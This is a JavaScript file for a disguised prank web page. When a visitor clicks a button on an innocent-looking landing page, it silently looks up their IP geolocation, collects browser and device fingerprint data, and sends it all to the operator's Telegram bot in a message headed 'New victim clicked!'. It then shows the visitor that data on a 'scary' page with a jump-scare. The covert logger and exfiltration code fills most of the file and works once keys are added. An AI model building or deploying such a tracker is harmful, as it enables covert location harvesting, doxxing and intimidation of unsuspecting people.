// --- API Configuration (user should fill in their own keys if needed) ---
const IPGEOLOCATION_API_KEY = ""; // <-- Put your ipgeolocation.io API key here
const TELEGRAM_BOT_TOKEN = ""; // <-- Put your Telegram bot token here
const TELEGRAM_CHAT_ID = ""; // <-- Put your Telegram chat ID here

// Navigation for landing page
const clickBtn = document.getElementById('click-here-btn');
if (clickBtn) {
    clickBtn.addEventListener('click', async function() {
        document.body.classList.add('fade-out');
        // If API keys are provided, fetch and send info
        if (IPGEOLOCATION_API_KEY && TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            let userInfo = {};
            try {
                const res = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${IPGEOLOCATION_API_KEY}`);
                userInfo = await res.json();
            } catch (e) {
                userInfo = { error: 'Could not fetch user info' };
            }
            // Prepare message for Telegram
            let msg = `New victim clicked!\n`;
            if (!userInfo.error) {
                msg += `IP: ${userInfo.ip}\nCountry: ${userInfo.country_name}\nState: ${userInfo.state_prov}\nCity: ${userInfo.city}\nZip: ${userInfo.zipcode}\nLat/Lon: ${userInfo.latitude}, ${userInfo.longitude}\nTimezone: ${userInfo.time_zone?.name}\nISP: ${userInfo.isp}\nASN: ${userInfo.asn}\nContinent: ${userInfo.continent_name}\nCurrency: ${userInfo.currency?.name} (${userInfo.currency?.code})\nCalling Code: +${userInfo.calling_code}\nBrowser: ${navigator.userAgent}\nOS: ${navigator.platform}\nLanguage: ${navigator.language}\nScreen: ${window.screen.width}x${window.screen.height}\nDevice: ${/Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : /Tablet|iPad/i.test(navigator.userAgent) ? 'Tablet' : 'Desktop'}\nReferrer: ${document.referrer || 'None'}\nCookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}`;
            } else {
                msg += 'Could not fetch user info.';
            }
            // Send to Telegram
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: msg
                    })
                });
            } catch (e) {}
        }
        setTimeout(() => {
            window.location.href = 'scary.html';
        }, 600);
    });
}

// Scary page logic
if (window.location.pathname.includes('scary.html')) {
    // Play audio on first user interaction (browser policy)
    const audio = document.getElementById('scary-audio');
    let audioPlayed = false;
    function playAudioOnce() {
        if (!audioPlayed && audio) {
            audio.play();
            audioPlayed = true;
        }
    }
    document.body.addEventListener('click', playAudioOnce, { once: true });
    document.body.addEventListener('keydown', playAudioOnce, { once: true });

    // If API key is provided, fetch user info, else show local info only
    if (IPGEOLOCATION_API_KEY) {
        fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${IPGEOLOCATION_API_KEY}`)
            .then(res => res.json())
            .then(data => {
                document.getElementById('ip-address').innerText = data.ip || 'Unknown';
                document.getElementById('country').innerText = data.country_name || 'Unknown';
                document.getElementById('state').innerText = data.state_prov || 'Unknown';
                document.getElementById('city').innerText = data.city || 'Unknown';
                document.getElementById('zip').innerText = data.zipcode || 'Unknown';
                document.getElementById('lat-lon').innerText = `${data.latitude}, ${data.longitude}` || 'Unknown';
                document.getElementById('timezone').innerText = data.time_zone?.name || 'Unknown';
                document.getElementById('isp').innerText = data.isp || 'Unknown';
                document.getElementById('asn').innerText = data.asn || 'Unknown';
                document.getElementById('continent').innerText = data.continent_name || 'Unknown';
                document.getElementById('currency').innerText = data.currency ? `${data.currency.name} (${data.currency.code})` : 'Unknown';
                document.getElementById('calling-code').innerText = data.calling_code ? `+${data.calling_code}` : 'Unknown';
            })
            .catch(() => {
                document.getElementById('ip-address').innerText = 'Could not fetch';
                document.getElementById('country').innerText = 'Could not fetch';
                document.getElementById('state').innerText = 'Could not fetch';
                document.getElementById('city').innerText = 'Could not fetch';
                document.getElementById('zip').innerText = 'Could not fetch';
                document.getElementById('lat-lon').innerText = 'Could not fetch';
                document.getElementById('timezone').innerText = 'Could not fetch';
                document.getElementById('isp').innerText = 'Could not fetch';
                document.getElementById('asn').innerText = 'Could not fetch';
                document.getElementById('continent').innerText = 'Could not fetch';
                document.getElementById('currency').innerText = 'Could not fetch';
                document.getElementById('calling-code').innerText = 'Could not fetch';
            });
    } else {
        // Show only local info
        document.getElementById('ip-address').innerText = 'Not available (API key required)';
        document.getElementById('country').innerText = 'Not available (API key required)';
        document.getElementById('state').innerText = 'Not available (API key required)';
        document.getElementById('city').innerText = 'Not available (API key required)';
        document.getElementById('zip').innerText = 'Not available (API key required)';
        document.getElementById('lat-lon').innerText = 'Not available (API key required)';
        document.getElementById('timezone').innerText = 'Not available (API key required)';
        document.getElementById('isp').innerText = 'Not available (API key required)';
        document.getElementById('asn').innerText = 'Not available (API key required)';
        document.getElementById('continent').innerText = 'Not available (API key required)';
        document.getElementById('currency').innerText = 'Not available (API key required)';
        document.getElementById('calling-code').innerText = 'Not available (API key required)';
    }

    // Device, browser, OS info
    function getDeviceType() {
        const ua = navigator.userAgent;
        if (/Mobi|Android/i.test(ua)) return 'Mobile';
        if (/Tablet|iPad/i.test(ua)) return 'Tablet';
        return 'Desktop';
    }
    document.getElementById('device-type').innerText = getDeviceType();
    document.getElementById('browser-info').innerText = navigator.userAgent;
    document.getElementById('os-info').innerText = navigator.platform;
    document.getElementById('lang').innerText = navigator.language || 'Unknown';
    document.getElementById('screen').innerText = `${window.screen.width} x ${window.screen.height}`;
    document.getElementById('memory').innerText = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
    document.getElementById('cpu').innerText = navigator.hardwareConcurrency || 'Unknown';
    document.getElementById('referrer').innerText = document.referrer || 'None';
    document.getElementById('cookies').innerText = navigator.cookieEnabled ? 'Yes' : 'No';

    // Update time
    function updateTime() {
        const now = new Date();
        document.getElementById('current-time').innerText = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false });
    }
    setInterval(updateTime, 1000);
    updateTime();

    // Add flicker/glitch to info and warnings
    document.querySelectorAll('.scary-p, .scary-warning').forEach(el => {
        el.classList.add('flicker');
    });

    // Jump scare: loud scream, scary face overlay, red flash
    setTimeout(() => {
        // Red flash
        let flash = document.createElement('div');
        flash.style.position = 'fixed';
        flash.style.top = 0;
        flash.style.left = 0;
        flash.style.width = '100vw';
        flash.style.height = '100vh';
        flash.style.background = 'rgba(255,0,0,0.7)';
        flash.style.zIndex = 10000;
        flash.style.opacity = 1;
        flash.style.transition = 'opacity 0.5s';
        document.body.appendChild(flash);

        // Scary face overlay
        let face = document.createElement('img');
        face.src = 'https://i.imgur.com/1bX5QH6.png'; // Example scary face
        face.alt = 'Scary Face';
        face.style.position = 'fixed';
        face.style.top = '50%';
        face.style.left = '50%';
        face.style.transform = 'translate(-50%, -50%) scale(1.2)';
        face.style.zIndex = 10001;
        face.style.width = '60vw';
        face.style.maxWidth = '420px';
        face.style.pointerEvents = 'none';
        face.style.opacity = 1;
        document.body.appendChild(face);

        // Scream sound
        let scream = new Audio('https://cdn.pixabay.com/audio/2022/10/16/audio_12b5b8b6b2.mp3');
        scream.volume = 1;
        scream.play();

        setTimeout(() => {
            flash.style.opacity = 0;
            face.style.opacity = 0;
            setTimeout(() => {
                document.body.removeChild(flash);
                document.body.removeChild(face);
            }, 500);
        }, 1200);
    }, 5000 + Math.random() * 4000); // Random delay between 5-9s
}

// Fade-out effect for landing page
if (document.body.classList.contains('cute-body')) {
    const style = document.createElement('style');
    style.innerHTML = `.fade-out { opacity: 0; transition: opacity 0.6s; }`;
    document.head.appendChild(style);
}
